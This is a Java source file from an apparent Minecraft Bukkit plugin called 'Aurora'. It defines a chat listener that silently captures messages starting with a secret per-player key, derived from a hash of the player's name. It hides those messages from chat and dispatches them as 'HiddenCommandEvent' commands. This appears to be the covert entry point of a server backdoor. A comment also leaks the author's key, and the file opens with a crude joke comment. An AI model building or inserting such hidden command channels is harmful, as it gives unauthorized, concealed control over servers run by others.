// penis cum poo poo test

package me.oscarcusick.aurora.Listeners;

import me.oscarcusick.aurora.Commands.HiddenCommandEvent;
import me.oscarcusick.aurora.Utility.GeneralUtility;
import net.md_5.bungee.api.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.plugin.Plugin;

import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;

public class ChatInterfaceListener implements Listener {
    Plugin PluginInstance;
    public ChatInterfaceListener(Plugin PluginInstance) {
        this.PluginInstance = PluginInstance;
    }

    @EventHandler(priority = EventPriority.LOWEST) // last in queue, final say
    public void ChatInterface(PlayerChatEvent event) throws NoSuchAlgorithmException { // any form of UI using chat will be handled through this
        GeneralUtility GU = new GeneralUtility(PluginInstance);
        Player ChatPlayer;
        String ChatText = event.getMessage(); // this will be regexed
        String[] CommandWords = ChatText.split(" "); // index 0 will contain the users inputted password

        // player check
        if (!(event.getPlayer() instanceof Player)) {
            return; // not player
        } ChatPlayer = event.getPlayer();

        String UsageKey = GU.Hash256(ChatPlayer.getName()).substring(3, 9); // this is the text that will verify you're not a rando

        // check to see if the player has set it, so they don't have to type it everytime
        if (GU.DoSecurityPrefix(ChatPlayer)) {
            // first check to see if the player's message starts with their correct player usage key
            // if the message doesn't start with the key, pretend like nothing happened
            if (!CommandWords[0].equalsIgnoreCase(UsageKey)) { // my key is '946b0e' REMOVE THIS COMMENT LATER
                return;
            } // past this point the ChatPlayer is confirmed to be able to access Aurora
        } event.setCancelled(true);

        // if there's not any command || command contains sec-prefix
        if (GU.DoSecurityPrefix(ChatPlayer) && CommandWords.length <= 1) {
            GU.TellPlayer(ChatPlayer, ChatColor.GREEN + "" + ChatColor.BOLD + "SUCCESS");
            return;
        } else if (CommandWords[0].contains(UsageKey.toLowerCase()) && !GU.DoSecurityPrefix(ChatPlayer)) { // if the key is there and it shouldn't
            GU.TellPlayer(ChatPlayer, ChatColor.RED + "" + ChatColor.BOLD + "Remove usage key as it was disabled");
            return;
        }

        // now we fill out a hidden command event and send it, so it can be handled somewhere else
        // determine where the command should be
        String Command;
        if (GU.DoSecurityPrefix(ChatPlayer)) {
            Command = CommandWords[1];
        }else {
            Command = CommandWords[0];
        }

        // determine strings, starts at either 1 or 2 and fill ALStrings accordingly
        ArrayList<String> ALStrings = new ArrayList<>();
        if (GU.DoSecurityPrefix(ChatPlayer)) {
            for (int i = 2; i < CommandWords.length; i++) {
                ALStrings.add(CommandWords[i]);
            }
        }else {
            for (int i = 1; i < CommandWords.length; i++) {
                ALStrings.add(CommandWords[i]);
            }
        }

        HiddenCommandEvent Event = new HiddenCommandEvent(ChatPlayer, Command, ALStrings.toArray());
        PluginInstance.getServer().getPluginManager().callEvent(Event); // send that shit and done
    }

}
